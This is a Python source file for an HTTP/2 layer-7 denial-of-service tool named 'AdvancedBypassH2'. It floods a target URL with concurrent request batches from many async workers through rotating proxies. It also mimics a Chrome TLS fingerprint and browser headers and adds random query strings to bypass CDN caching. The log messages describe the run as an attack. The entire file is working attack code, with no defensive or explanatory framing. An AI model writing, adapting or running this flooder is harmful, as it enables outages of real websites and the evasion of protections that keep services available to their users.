import asyncio
import httpx
import random
import logging
import ssl
import time
from typing import List, Optional

class AdvancedBypassH2:
    """
    Advanced L7 Bypass Vector v1.0.
    Features:
    - HTTP/2 Multiplexing
    - JA3 Fingerprint Spoofing
    - Dynamic Header Rotation
    - Adaptive Rate Control
    """
    def __init__(self, target_url: str, proxies: Optional[List[str]] = None):
        self.target = target_url
        self.proxies = proxies
        self.logger = logging.getLogger("AdvancedBypassH2")
        self.total_requests = 0
        self._stop_event = asyncio.Event()
        
        # Mimic Chrome 121 JA3/JA4
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]

    def _get_custom_ssl_context(self):
        """
        Creates an SSL context that mimics a modern browser's TLS fingerprint.
        """
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        # Mimic modern cipher suites
        context.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384')
        context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        context.set_alpn_protocols(['h2', 'http/1.1'])
        return context

    async def _attack_worker(self, proxy: Optional[str] = None):
        limits = httpx.Limits(max_keepalive_connections=100, max_connections=200)
        ssl_context = self._get_custom_ssl_context()
        
        async with httpx.AsyncClient(
            http2=True, 
            proxy=proxy, 
            verify=ssl_context, 
            limits=limits,
            timeout=10,
            follow_redirects=True
        ) as client:
            while not self._stop_event.is_set():
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
                    "Sec-Ch-Ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                
                # Add random query to bypass CDN cache
                url = f"{self.target}?q={random.randint(100000, 999999)}"
                
                try:
                    # Multiplexing: send multiple requests concurrently on the same client
                    tasks = [client.get(url, headers=headers) for _ in range(10)]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for res in responses:
                        if isinstance(res, httpx.Response):
                            self.total_requests += 1
                except Exception:
                    pass
                
                # Tiny sleep to avoid local CPU saturation
                await asyncio.sleep(0.01)

    async def start(self, duration: int, threads: int = 50):
        self.logger.info(f"[*] Starting Advanced Bypass H2 on {self.target} with {threads} workers...")
        self.start_time = time.time()
        
        workers = []
        for i in range(threads):
            proxy = random.choice(self.proxies) if self.proxies else None
            workers.append(asyncio.create_task(self._attack_worker(proxy)))
            
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout=duration)
        except asyncio.TimeoutError:
            self.logger.info("[*] Duration reached. Stopping God-Tier Attack...")
        finally:
            self._stop_event.set()
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            
            elapsed = time.time() - self.start_time
            rps = self.total_requests / elapsed if elapsed > 0 else 0
            self.logger.info(f"[+] Attack Finished. Total Requests: {self.total_requests}, Avg RPS: {rps:.2f}")

    def stop(self):
        self._stop_event.set()
